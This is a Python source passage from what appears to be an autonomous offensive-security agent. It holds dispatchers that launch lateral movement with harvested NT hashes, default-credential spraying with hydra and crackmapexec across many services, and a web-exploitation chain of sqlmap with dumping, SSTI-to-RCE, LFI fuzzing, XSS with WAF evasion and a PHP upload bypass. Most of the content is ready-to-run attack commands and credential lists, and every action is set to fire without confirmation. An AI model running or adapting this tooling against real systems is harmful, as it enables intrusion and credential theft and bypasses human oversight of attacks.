    def _next_lateral_primer(
        self,
        *, intel:           dict,
        target:             str,
        used_tools:         Dict[str, int],
        negative_memory:    NegativeMemory,
    ) -> Optional[JustifiedAction]:
        """Lateral-movement chain dispatcher.  Requires a real foothold
        AND at least one piece of harvested loot OR an internal subnet
        visible from the foothold."""
        if not intel.get("shell_access"):
            return None
        # Don't start lateral until post-foothold has had at least a few
        # passes — otherwise we have nothing to reuse.
        if not intel.get("_post_foothold_fired"):
            return None

        os_kind = self._infer_shell_os(intel)
        loot = intel.get("loot") or {}        # populated by post-foothold + #7 pipeline
        has_ssh_keys = bool(loot.get("ssh_keys"))
        has_nt_hash  = bool(loot.get("nt_hashes"))
        has_tgt      = bool(loot.get("kerberos_tgts"))
        is_da        = (intel.get("current_user") or "").lower() in {"administrator", "domain admin", "system"}

        loot_user   = (loot.get("nt_hashes") or [{}])[0].get("user", "") if has_nt_hash else ""
        loot_hash   = (loot.get("nt_hashes") or [{}])[0].get("hash", "") if has_nt_hash else ""
        lateral_target = (intel.get("lateral_targets") or [None])[0] or ""

        fired = intel.setdefault("_lateral_fired", set())
        if isinstance(fired, list):
            fired = set(fired); intel["_lateral_fired"] = fired

        for primer in self._LATERAL_PRIMERS:
            primer_key = primer["chain"]
            if primer_key in fired:
                continue
            # OS match (when set) — skip primers that don't match the
            # foothold OS.
            if "os" in primer:
                if os_kind not in [o.lower() for o in primer["os"]]:
                    continue
            # Port match (when set) — applies to operator-side primers
            # (PTH spray, DCSync) that run from the operator host.
            if "ports" in primer:
                open_ports = self._collect_open_ports(intel)
                if not (set(primer["ports"]) & open_ports):
                    continue
            # Loot prerequisites
            need_loot = primer.get("needs_loot")
            if need_loot == "ssh_keys" and not has_ssh_keys:
                continue
            if need_loot == "nt_hash" and not has_nt_hash:
                continue
            if need_loot == "tgt" and not has_tgt:
                continue
            if primer.get("needs_priv") == "domain_admin" and not is_da:
                continue

            tool = primer["tool"]
            svc  = primer["service_label"]
            try:
                args_filled = primer["args"].format(
                    target = target,
                    lhost  = intel.get("lhost") or "127.0.0.1",
                    domain = self._resolve_ad_domain(intel) or "",
                    loot_user = loot_user,
                    loot_hash = loot_hash,
                    lateral_target = lateral_target or target,
                )
            except Exception:
                continue
            if negative_memory.has_failed_before(tool, svc, args=args_filled[:200]):
                fired.add(primer_key)
                continue
            fired.add(primer_key)
            return JustifiedAction(
                action_id            = f"lateral-{primer_key}",
                tool                 = tool,
                args                 = args_filled,
                target_service       = svc,
                reason               = f"[Lateral/{primer_key}] {primer['rationale']}",
                expected_outcome     = "Internal hosts mapped, harvested creds reused, pivot tunnel up",
                success_criteria     = "Discovered host list grows / new shell registered / tunnel listening",
                hypothesis_id        = "lateral-primer",
                confidence           = 0.86,
                requires_confirmation= False,
            )
        return None

    # ────────────────────────────────────────────────────────────────────
    #  #5 Default-credential spray primer
    # ────────────────────────────────────────────────────────────────────
    # When operator hasn't given creds AND no easy unauth path was
    # found, try the small-N most common default username:password
    # pairs known to ship vulnerable on each service.  Each step is a
    # single bounded check (NOT a wordlist brute), so lockout risk is
    # minimal — at most 3-5 attempts per service.
    #
    # The wider brute-force tools (hydra full lists) are reserved for
    # the LLM-driven planner — too noisy / lockout-risky to fire
    # automatically.
    _DEFAULT_CREDS_PRIMERS: List[Dict[str, Any]] = [
        # SSH — the top 5 default pairs that ship in CTFs / IoT / sandboxes
        {"chain": "default_ssh", "ports": ["22"],
         "tool": "hydra",
         "args": "-L /tmp/argus.default_ssh_users.txt -P /tmp/argus.default_ssh_pass.txt -t 4 -f -o /tmp/argus.ssh_creds.{target}.txt ssh://{target}",
         "service_label": "ssh:22",
         "rationale": "test top SSH defaults: root/root, root/toor, admin/admin, pi/raspberry, ubuntu/ubuntu",
         "wordlist_user": ["root", "admin", "ubuntu", "pi", "user"],
         "wordlist_pass": ["root", "toor", "admin", "raspberry", "ubuntu", "user", "12345", "password"]},
        # FTP — anonymous + 3 commodity defaults
        {"chain": "default_ftp", "ports": ["21"],
         "tool": "hydra",
         "args": "-L /tmp/argus.default_ftp_users.txt -P /tmp/argus.default_ftp_pass.txt -t 4 -f -o /tmp/argus.ftp_creds.{target}.txt ftp://{target}",
         "service_label": "ftp:21",
         "rationale": "FTP defaults: anonymous, ftp/ftp, admin/admin",
         "wordlist_user": ["anonymous", "ftp", "admin"],
         "wordlist_pass": ["anonymous", "ftp", "admin", ""]},
        # MySQL — root with empty / root / common
        {"chain": "default_mysql", "ports": ["3306"],
         "tool": "hydra",
         "args": "-L /tmp/argus.default_mysql_users.txt -P /tmp/argus.default_mysql_pass.txt -t 4 -f -o /tmp/argus.mysql_creds.{target}.txt mysql://{target}",
         "service_label": "mysql:3306",
         "rationale": "MySQL defaults: root/empty, root/root, mysql/mysql",
         "wordlist_user": ["root", "mysql", "admin"],
         "wordlist_pass": ["", "root", "mysql", "admin", "password"]},
        # PostgreSQL — postgres/postgres + common
        {"chain": "default_postgres", "ports": ["5432"],
         "tool": "hydra",
         "args": "-L /tmp/argus.default_pg_users.txt -P /tmp/argus.default_pg_pass.txt -t 4 -f -o /tmp/argus.pg_creds.{target}.txt postgres://{target}",
         "service_label": "postgresql:5432",
         "rationale": "Postgres defaults: postgres/postgres, postgres/empty, admin/admin",
         "wordlist_user": ["postgres", "admin"],
         "wordlist_pass": ["postgres", "", "admin", "password"]},
        # MSSQL — sa/sa + sa/empty
        {"chain": "default_mssql", "ports": ["1433"],
         "tool": "hydra",
         "args": "-L /tmp/argus.default_mssql_users.txt -P /tmp/argus.default_mssql_pass.txt -t 4 -f -o /tmp/argus.mssql_creds.{target}.txt mssql://{target}",
         "service_label": "mssql:1433",
         "rationale": "MSSQL defaults: sa/sa, sa/empty, sa/Password123",
         "wordlist_user": ["sa", "admin", "sql"],
         "wordlist_pass": ["sa", "", "admin", "Password123", "P@ssw0rd"]},
        # SMB — Administrator / guest defaults  (small list to avoid lockout)
        {"chain": "default_smb", "ports": ["445"],
         "tool": "crackmapexec",
         "args": "smb {target} -u 'Administrator,guest,admin' -p 'Password123,Welcome1,P@ssw0rd,admin,'  --no-bruteforce",
         "service_label": "smb:445",
         "rationale": "SMB top-3 default identities × top-5 commodity passwords (lockout-safe)",
         "no_wordlist": True},
        # WinRM — same identities
        {"chain": "default_winrm", "ports": ["5985"],
         "tool": "crackmapexec",
         "args": "winrm {target} -u 'Administrator,admin' -p 'Password123,Welcome1,P@ssw0rd,admin'  --no-bruteforce",
         "service_label": "winrm:5985",
         "rationale": "WinRM with default Administrator passwords",
         "no_wordlist": True},
        # Telnet
        {"chain": "default_telnet", "ports": ["23"],
         "tool": "hydra",
         "args": "-L /tmp/argus.default_telnet_users.txt -P /tmp/argus.default_telnet_pass.txt -t 4 -f -o /tmp/argus.telnet_creds.{target}.txt telnet://{target}",
         "service_label": "telnet:23",
         "rationale": "Telnet defaults: root/root, admin/admin, cisco/cisco, root/empty",
         "wordlist_user": ["root", "admin", "cisco", "support"],
         "wordlist_pass": ["root", "admin", "cisco", "support", "", "password"]},
        # Tomcat manager
        {"chain": "default_tomcat", "ports": ["8080", "8443"],
         "tool": "hydra",
         "args": "-L /tmp/argus.default_tomcat_users.txt -P /tmp/argus.default_tomcat_pass.txt -t 4 -f -o /tmp/argus.tomcat_creds.{target}.txt -s {port} http-get://{target}/manager/html",
         "service_label": "tomcat:{port}",
         "rationale": "Tomcat manager defaults — tomcat/s3cret, admin/admin, manager/manager",
         "wordlist_user": ["tomcat", "admin", "manager", "root"],
         "wordlist_pass": ["tomcat", "s3cret", "admin", "manager", "password", "Password123"]},
        # Redis — empty AUTH check
        {"chain": "default_redis_empty", "ports": ["6379"],
         "tool": "redis-cli",
         "args": "-h {target} INFO server",
         "service_label": "redis:6379",
         "rationale": "Redis without AUTH — returns INFO when unprotected"},
        # MongoDB — unauth listDatabases
        {"chain": "default_mongo_unauth", "ports": ["27017"],
         "tool": "mongosh",
         "args": "--host {target} --eval 'db.adminCommand({{listDatabases:1}})'",
         "service_label": "mongodb:27017",
         "rationale": "Mongo without auth — admin DB list confirms unauthenticated access"},
        # SNMP public/private
        {"chain": "default_snmp_public", "ports": ["161"],
         "tool": "snmpwalk",
         "args": "-v 2c -c public -t 5 -r 1 {target} 1.3.6.1.2.1.1",
         "service_label": "snmp:161",
         "rationale": "SNMP community 'public' — system MIB walk"},
        {"chain": "default_snmp_private", "ports": ["161"],
         "tool": "snmpwalk",
         "args": "-v 2c -c private -t 5 -r 1 {target} 1.3.6.1.2.1.1",
         "service_label": "snmp:161",
         "rationale": "SNMP community 'private' — read-write access common on legacy gear"},
        # VNC empty / common
        {"chain": "default_vnc", "ports": ["5900", "5901"],
         "tool": "hydra",
         "args": "-P /tmp/argus.default_vnc_pass.txt -t 1 -f -o /tmp/argus.vnc_creds.{target}.txt vnc://{target}",
         "service_label": "vnc:{port}",
         "rationale": "VNC with empty / 'password' / '12345' — display 0 / 1",
         "wordlist_pass": ["password", "12345", "vnc", "admin", ""]},
    ]

    def _next_default_creds_primer(
        self,
        *, intel:           dict,
        target:             str,
        used_tools:         Dict[str, int],
        negative_memory:    NegativeMemory,
    ) -> Optional[JustifiedAction]:
        """Default-credential spray dispatcher.  Skips when the
        operator already provided creds (cred-primer takes over) or
        when the target shows lockout signals."""
        if self._extract_credentials(intel):
            return None
        if intel.get("shell_access"):
            return None
        # Honour an explicit opt-out — operator can disable spraying when
        # they're worried about lockout policy.
        if intel.get("disable_default_spray"):
            return None
        open_ports = self._collect_open_ports(intel)
        if not open_ports:
            return None

        fired = intel.setdefault("_default_creds_fired", set())
        if isinstance(fired, list):
            fired = set(fired); intel["_default_creds_fired"] = fired

        for primer in self._DEFAULT_CREDS_PRIMERS:
            ports = set(primer["ports"]) & open_ports
            if not ports:
                continue
            primer_key = primer["chain"]
            if primer_key in fired:
                continue
            tool = primer["tool"]
            port = sorted(ports)[0]
            svc  = primer["service_label"].format(port=port)

            # Drop wordlist files to /tmp so hydra can read them
            if not primer.get("no_wordlist") and "wordlist_user" in primer:
                self._write_wordlist(f"/tmp/argus.default_{primer_key.split('_',1)[1]}_users.txt",
                                      primer["wordlist_user"])
            if not primer.get("no_wordlist") and "wordlist_pass" in primer:
                self._write_wordlist(f"/tmp/argus.default_{primer_key.split('_',1)[1]}_pass.txt",
                                      primer["wordlist_pass"])

            try:
                args_filled = primer["args"].format(target=target, port=port)
            except Exception:
                continue
            if negative_memory.has_failed_before(tool, svc, args=args_filled):
                fired.add(primer_key)
                continue
            fired.add(primer_key)
            return JustifiedAction(
                action_id            = f"default-creds-{primer_key}",
                tool                 = tool,
                args                 = args_filled,
                target_service       = svc,
                reason               = f"[Default-Creds/{primer_key}] {primer['rationale']}",
                expected_outcome     = "Hit on default credentials → upgrade to credentialed-primer chain",
                success_criteria     = "Tool reports valid login (hydra ‘host:port login: pass:’ format)",
                hypothesis_id        = "default-creds-primer",
                confidence           = 0.78,
                requires_confirmation= False,
            )
        return None

    @staticmethod
    def _write_wordlist(path: str, words: List[str]) -> None:
        """Idempotent wordlist file writer for hydra to consume."""
        try:
            import os as _os
            existing = ""
            if _os.path.exists(path):
                with open(path) as f:
                    existing = f.read()
            payload = "\n".join(words) + "\n"
            if existing != payload:
                with open(path, "w") as f:
                    f.write(payload)
        except Exception:
            pass

    # ────────────────────────────────────────────────────────────────────
    #  #2 Web-exploitation primer
    # ────────────────────────────────────────────────────────────────────
    # When http(s) is open and we don't have a shell yet, fire a
    # deterministic ladder of web vuln probes.  Each step's output is
    # parsed for follow-on opportunities (sqlmap target lists, upload
    # endpoints, parameter discovery results).
    #
    # Steps progress from *cheap-recon* → *targeted-vuln* → *RCE*.
    # Later steps gate on facts produced by earlier steps so we don't
    # blindly fire sqlmap against a 404-only host.
    _WEB_EXPLOIT_PRIMERS: List[Dict[str, Any]] = [
        # ── Cheap recon: fingerprint + common-paths ─────────────────────
        {"chain": "web_whatweb", "ports": ["80", "443", "8080", "8443"],
         "tool": "whatweb",
         "args": "-a 3 --colour=never --no-errors http://{target}{port_suffix}/",
         "service_label": "http:{port}",
         "rationale": "fingerprint webapp / framework / CMS to drive next step"},
        # ── Templated multi-CVE scan (single tool, hundreds of checks) ──
        {"chain": "web_nuclei", "ports": ["80", "443", "8080", "8443"],
         "tool": "nuclei",
         "args": "-u http://{target}{port_suffix}/ -severity critical,high,medium -silent -nh -timeout 10",
         "service_label": "http:{port}",
         "rationale": "nuclei templated scan — covers 6000+ CVE / misconfig templates"},
        # ── Content discovery (find the SQLi / upload / admin pages) ────
        {"chain": "web_feroxbuster", "ports": ["80", "443", "8080", "8443"],
         "tool": "feroxbuster",
         "args": "-u http://{target}{port_suffix}/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -s 200,204,301,302,307,401,403 -t 50 -d 2 --no-state -k --silent",
         "service_label": "http:{port}",
         "rationale": "discover hidden directories — admin panels, upload endpoints, sensitive paths"},
        # ── CMS-specific — only fire when whatweb tagged the CMS ────────
        {"chain": "web_wpscan", "ports": ["80", "443"],
         "tool": "wpscan",
         "args": "--url http://{target}{port_suffix}/ --enumerate u,vp,vt --random-user-agent --no-banner --disable-tls-checks",
         "service_label": "http:{port}",
         "rationale": "WordPress vuln/user enum — when WP detected by whatweb",
         "needs_tag": "wordpress"},
        {"chain": "web_droopescan_drupal", "ports": ["80", "443"],
         "tool": "droopescan",
         "args": "scan drupal -u http://{target}{port_suffix}/",
         "service_label": "http:{port}",
         "rationale": "Drupal vuln scan — Druggedalon / Drupalgeddon CVEs",
         "needs_tag": "drupal"},
        {"chain": "web_joomscan", "ports": ["80", "443"],
         "tool": "joomscan",
         "args": "--url http://{target}{port_suffix}/",
         "service_label": "http:{port}",
         "rationale": "Joomla component CVE scan",
         "needs_tag": "joomla"},
        # ── Parameter discovery on the live URL ─────────────────────────
        {"chain": "web_arjun_params", "ports": ["80", "443", "8080", "8443"],
         "tool": "arjun",
         "args": "-u http://{target}{port_suffix}/ --stable -t 20",
         "service_label": "http:{port}",
         "rationale": "discover hidden GET/POST parameters — feed to sqlmap / xss tools"},
        # ── SQLi sweep on every discovered URL with parameters ──────────
        {"chain": "web_sqlmap_sweep", "ports": ["80", "443", "8080", "8443"],
         "tool": "sqlmap",
         "args": "-m /tmp/argus.urls.{target}.txt --batch --random-agent --level=3 --risk=2 --threads=5 --output-dir=/tmp/sqlmap.{target} --crawl=2",
         "service_label": "http:{port}",
         "rationale": "SQLi against discovered parameter URLs — auto-DBMS detect, dump on hit",
         "needs_urls": True},
        # ── SSTI probe on input forms ───────────────────────────────────
        {"chain": "web_tplmap", "ports": ["80", "443", "8080", "8443"],
         "tool": "tplmap",
         "args": "-u 'http://{target}{port_suffix}/' --crawl 2 --level 3 --random-agent",
         "service_label": "http:{port}",
         "rationale": "SSTI sweep — Jinja2/Twig/ERB/Freemarker → RCE on hit"},
        # ── LFI / RFI tester ───────────────────────────────────────────
        {"chain": "web_ffuf_lfi", "ports": ["80", "443", "8080", "8443"],
         "tool": "ffuf",
         "args": "-u http://{target}{port_suffix}/?file=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mc 200 -fs 0 -t 40 -s",
         "service_label": "http:{port}",
         "rationale": "fuzz file= parameter for LFI — log poisoning / source disclosure"},
        # ── XSS sweep (dalfox, after parameter discovery) ───────────────
        {"chain": "web_dalfox", "ports": ["80", "443", "8080", "8443"],
         "tool": "dalfox",
         "args": "url 'http://{target}{port_suffix}/' --silence --skip-bav --waf-evasion -w 30 --timeout 10",
         "service_label": "http:{port}",
         "rationale": "DOM + reflected XSS sweep with WAF evasion"},
        # ── Upload bypass (manual / scripted) ──────────────────────────
        {"chain": "web_upload_probe", "ports": ["80", "443", "8080", "8443"],
         "tool": "curl",
         "args": "-s -o /dev/null -w 'http=%{{http_code}}\\n' -X POST -F 'file=@/tmp/argus-test.png;type=image/png;filename=t.php' http://{target}{port_suffix}/upload.php",
         "service_label": "http:{port}",
         "rationale": "test file-upload endpoint accepts double-extension / mime-mismatch"},
        # ── Java deserialization / Log4Shell scan ──────────────────────
        {"chain": "web_log4shell", "ports": ["80", "443", "8080", "8443"],
         "tool": "nuclei",
         "args": "-u http://{target}{port_suffix}/ -t cves/2021/CVE-2021-44228.yaml -nh -silent",
         "service_label": "http:{port}",
         "rationale": "targeted Log4Shell probe — CVE-2021-44228 still common in legacy stacks"},
        # ── WebDAV upload check ────────────────────────────────────────
        {"chain": "web_davtest", "ports": ["80", "443", "8080", "8443"],
         "tool": "davtest",
         "args": "-url http://{target}{port_suffix}/",
         "service_label": "http:{port}",
         "rationale": "WebDAV PUT-then-execute paths — quick RCE when DAV is enabled"},
    ]

    def _next_web_exploit_primer(
        self,
        *, intel:           dict,
        target:             str,
        used_tools:         Dict[str, int],
        negative_memory:    NegativeMemory,
    ) -> Optional[JustifiedAction]:
        """Web-exploitation chain dispatcher.  Skips when shell already
        obtained (post-foothold takes over) or when no http(s) port open."""
        if intel.get("shell_access"):
            return None
        open_ports = self._collect_open_ports(intel)
        web_ports = open_ports & {"80", "443", "8080", "8443", "8000", "8888", "8001", "8081", "5000", "5001", "9000"}
        if not web_ports:
            return None

        # Primary web port — prefer 443 → 80 → 8443 → 8080 → first hit
        port = next((p for p in ("443", "80", "8443", "8080") if p in web_ports), sorted(web_ports)[0])
        port_suffix = "" if port in ("80", "443") else f":{port}"
        # http vs https — naive but works most of the time
        scheme = "https" if port in ("443", "8443") else "http"

        fired = intel.setdefault("_web_exploit_fired", set())
        if isinstance(fired, list):
            fired = set(fired); intel["_web_exploit_fired"] = fired

        # Tags from whatweb / wappalyzer scrape — populated by web_whatweb step
        cms_tags = {t.lower() for t in (intel.get("web_tech_tags") or [])}
        urls_known = bool(intel.get("web_param_urls"))

        for primer in self._WEB_EXPLOIT_PRIMERS:
            if not (set(primer["ports"]) & web_ports):
                continue
            primer_key = primer["chain"]
            if primer_key in fired:
                continue
            tool = primer["tool"]
            svc  = primer["service_label"].format(port=port)

            # CMS-tagged steps wait until the CMS is detected
            need_tag = primer.get("needs_tag")
            if need_tag and need_tag.lower() not in cms_tags:
                continue
            # URL-list-fed steps wait until parameter discovery has output
            if primer.get("needs_urls") and not urls_known:
                continue

            try:
                args_filled = primer["args"].format(
                    target=target, port=port, port_suffix=port_suffix, scheme=scheme,
                )
            except Exception:
                continue
            # Replace bare http:// with the right scheme when port is 443/8443
            if scheme == "https":
                args_filled = args_filled.replace("http://", "https://")
            if negative_memory.has_failed_before(tool, svc, args=args_filled):
                fired.add(primer_key)
                continue
            fired.add(primer_key)
            return JustifiedAction(
                action_id            = f"web-primer-{primer_key}",
                tool                 = tool,
                args                 = args_filled,
                target_service       = svc,
                reason               = f"[Web-Primer/{primer_key}] {primer['rationale']}",
                expected_outcome     = "Vulnerability identified / parameter discovered / RCE achieved",
                success_criteria     = "Tool exits 0; finding stored; if RCE → register_shell trips",
                hypothesis_id        = "web-exploit-primer",
                confidence           = 0.83,
                requires_confirmation= False,
            )
        return None

    @staticmethod
    def _infer_shell_os(intel: dict) -> str:
        """Best-effort: linux / windows / unknown."""
        # Explicit hint set by exploit phase
        kind = (intel.get("shell_os") or "").lower()
        if kind:
            return kind
        # Fall back to global os_guess
        guess = (intel.get("os_guess") or "").lower()
        if "windows" in guess:
            return "windows"
        if any(x in guess for x in ("linux", "unix", "freebsd", "openbsd", "ubuntu", "debian", "centos", "rhel")):
            return "linux"
        return ""

    @staticmethod
    def _shell_user_is_privileged(intel: dict) -> bool:
        """True when the active shell's user is root / SYSTEM / administrator."""
        u = (intel.get("current_user") or "").lower()
        return u in {"root", "system", "nt authority\\system", "administrator", "domain admin"}

    @staticmethod
    def _collected_ad_users(intel: dict, target: str) -> List[str]:
        """Best-effort: pull discovered AD usernames from intel state.
        Looks at intel.users (a list of strings), intel.ad.users, and
        the on-disk users file kerbrute / null-session enum write to.
        """
        users: List[str] = []
        for u in (intel.get("users") or []):
            if isinstance(u, str) and u and u not in users:
                users.append(u)
        ad = intel.get("ad") or {}
        if isinstance(ad, dict):
            for u in (ad.get("users") or []):
                if isinstance(u, str) and u and u not in users:
                    users.append(u)
        # Filesystem fallback — primer step #5 writes the canonical file
        try:
            import os as _os
            fp = f"/tmp/argus.users.{target}.txt"
            if _os.path.exists(fp):
                with open(fp) as _f:
                    for line in _f:
                        line = line.strip()
                        if line and line not in users:
                            users.append(line)
        except Exception:
            pass
        return users

    # ── Recommendation E: foothold-primer auto-promotion ──────────────────

    # Map of (port → (chain_id, tool, args_template)) — the read-only first
    # step of each cheap-foothold primer chain.  These run before any
    # LLM-proposed action whenever their port is open and they haven't
    # yet fired this session.  Args use a bare {target} placeholder.
    _FOOTHOLD_PRIMERS: List[Dict[str, Any]] = [
        # FTP anonymous probe
        {"chain": "ftp_anonymous_login", "ports": ["21"],
         "tool": "nmap", "args": "--script ftp-anon -p21 {target}",
         "service_label": "ftp:21",
         "rationale": "vsftpd/proftpd routinely ship with anon-read enabled"},
        # Telnet — passive nmap probe (no brute on first iteration)
        {"chain": "telnet_default_creds", "ports": ["23"],
         "tool": "nmap", "args": "-sV -p23 --script banner {target}",
         "service_label": "telnet:23",
         "rationale": "telnet banner often leaks default-creds product family"},
        # SNMP public walk
        {"chain": "snmp_public_v2c_walk", "ports": ["161"],
         "tool": "snmpwalk", "args": "-v 2c -c public {target}",
         "service_label": "snmp:161",
         "rationale": "default community 'public' leaks users + processes"},
        # SMB null-session enum
        {"chain": "smb_anonymous_enum", "ports": ["139", "445"],
         "tool": "smbclient", "args": "-L //{target}/ -N",
         "service_label": "smb:445",
         "rationale": "null-session shares + user enum still works on many boxes"},
        # MySQL empty-password root
        {"chain": "db_default_creds_quick", "ports": ["3306"],
         "tool": "mysql", "args": "-h {target} -u root -e 'SHOW DATABASES;'",
         "service_label": "mysql:3306",
         "rationale": "lab boxes often leave root/'' enabled"},
        # Postgres default
        {"chain": "db_default_creds_quick", "ports": ["5432"],
         "tool": "psql", "args": "-h {target} -U postgres -c '\\l' -W postgres",
         "service_label": "postgresql:5432",
         "rationale": "default postgres/postgres credentials"},
        # MongoDB unauth
        {"chain": "db_default_creds_quick", "ports": ["27017"],
         "tool": "mongosh", "args": "--host {target} --eval 'db.adminCommand({listDatabases:1})'",
         "service_label": "mongodb:27017",
         "rationale": "unauthenticated Mongo on default port"},
        # Redis unauth
        {"chain": "redis_unauth_to_shell", "ports": ["6379"],
         "tool": "redis-cli", "args": "-h {target} ping",
         "service_label": "redis:6379",
         "rationale": "unauthenticated Redis ping → write-key foothold"},
    ]

    def _next_unused_foothold_primer(
        self,
        *, intel:           dict,
        target:             str,
        used_tools:         Dict[str, int],
        negative_memory:    NegativeMemory,
    ) -> Optional[JustifiedAction]:
        """Return a primer action if any open service has a primer that
        has not yet fired and was not already banned.  None otherwise.

        The intent is "always knock on the obvious doors before invoking
        the heavyweight planner".  Once every applicable primer has run
        once, this returns None forever (per session) and the normal
        LLM-driven planner takes over.
        """
        # Open ports — accept ints or strings or {port:..} dicts.
        open_ports: set = set()
        for p in (intel.get("open_ports") or []):
            if isinstance(p, dict):
                pp = p.get("port")
                if pp is not None:
                    open_ports.add(str(pp))
            else:
                open_ports.add(str(p).split("/")[0])

        if not open_ports:
            return None

        # Track which primers have already fired this session via a
        # state key on intel (reset on session-start).
        fired = intel.setdefault("_foothold_primers_fired", set())
        if isinstance(fired, list):
            fired = set(fired)
            intel["_foothold_primers_fired"] = fired

        for primer in self._FOOTHOLD_PRIMERS:
            if not (set(primer["ports"]) & open_ports):
                continue
            primer_key = primer["chain"] + ":" + primer["service_label"]
            if primer_key in fired:
                continue
            tool = primer["tool"]
            svc  = primer["service_label"]
            # Respect negative memory — if this exact probe failed already,
            # skip it (saves a round-trip on a confirmed-dead service).
            try:
                args_filled = primer["args"].format(target=target)
            except Exception:
                args_filled = primer["args"]
            if negative_memory.has_failed_before(tool, svc, args=args_filled):
                # Mark fired so we don't re-evaluate it next iteration.
                fired.add(primer_key)
                continue

            # Mark fired pre-emptively so a slow listener / repeated
            # select_action call doesn't re-issue the same primer.
            fired.add(primer_key)

            return JustifiedAction(
                action_id            = f"primer-{primer['chain']}-{primer['service_label']}",
                tool                 = tool,
                args                 = args_filled,
                target_service       = svc,
                reason               = (
                    f"[Primer/{primer['chain']}] cheap-unauth probe before LLM "
                    f"planner — {primer['rationale']}"
                ),
                expected_outcome     = "Primer banner / version / share list / unauth confirmation",
                success_criteria     = "Tool exits 0 with non-error output indicating service responds",
                hypothesis_id        = "primer",
                confidence           = 0.85,
                requires_confirmation= False,
            )
        return None

    def _build_reason(self, hypothesis: Hypothesis) -> str:
        """Format a justification string from a hypothesis."""
        evidence = " | ".join(hypothesis.evidence_supporting[:2])
        return (
            f"Hypothesis: {hypothesis.statement[:80]}. "
            f"Confidence: {hypothesis.confidence:.2f}. "
            f"Evidence: {evidence}"
        )

    def _build_success_criteria(self, hypothesis: Hypothesis) -> str:
        """Derive success criteria from the hypothesis required_evidence."""
        if hypothesis.required_evidence:
            return "Confirm: " + " AND ".join(hypothesis.required_evidence[:2])
        return "Hypothesis validated — action produced expected output"

    async def _emit_reasoning(self, message: str) -> None:
        """Emit a reasoning trace event to the frontend."""
        try:
            if callable(self._emit):
                await self._emit({
                    "type":       "reasoning_decision",
                    "session_id": self._session_id,
                    "agent":      "master",
                    "data":       {"message": message, "component": "decision_engine"},
                })
        except Exception:
            pass

    async def _emit_voi_ranking(self, ranked: List[Dict[str, Any]]) -> None:
        """Emit the top-N VoI-ranked candidates so the operator can see *why*
        a particular action was chosen and what runners-up were considered."""
        try:
            if not callable(self._emit):
                return
            payload = []
            for r in ranked:
                payload.append({
                    "tool":           r.get("tool"),
                    "args":           r.get("args"),
                    "target_service": r.get("target_service"),
                    "action_str":     r.get("action_str"),
                    "voi_score":      r.get("voi_score"),
                    "voi_factors":    r.get("voi_factors") or {},
                    "voi_reasons":    r.get("voi_reasons") or [],
                    "voi_dropped":    bool(r.get("voi_dropped", False)),
                    "confidence":     r.get("confidence"),
                })
            await self._emit({
                "type":       "voi_ranking",
                "session_id": self._session_id,
                "agent":      "master",
                "data":       {"top": payload, "count": len(payload)},
            })
        except Exception:
            pass

    async def _emit_action(self, action: JustifiedAction) -> None:
        """Emit a justified_action event to the frontend."""
        try:
            if callable(self._emit):
                await self._emit({
                    "type":       "justified_action",
                    "session_id": self._session_id,
                    "agent":      "master",
                    "data":       action.to_dict(),
                })
        except Exception:
            pass
